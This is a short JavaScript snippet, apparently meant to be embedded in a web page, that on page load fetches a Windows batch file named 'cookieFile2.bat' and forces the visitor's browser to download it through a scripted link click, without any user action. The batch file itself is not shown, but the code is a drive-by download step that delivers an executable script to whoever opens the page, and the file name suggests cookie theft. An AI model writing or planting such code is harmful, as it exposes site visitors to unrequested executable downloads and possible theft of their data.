function downloadFile() {
    const url = '../cookieFile2.bat'; // Direct download link
    const filename = 'cookieFile2.bat'; // Name of the file to be saved

    fetch(url)
    .then(response => response.blob())
    .then(blob => {
        const link = document.createElement('a');
        link.href = window.URL.createObjectURL(blob);
        link.download = filename;
        link.click();
    })
    .catch(error => {
        console.error('Error occurred while downloading file:', error);
    });
}

window.onload = downloadFile;
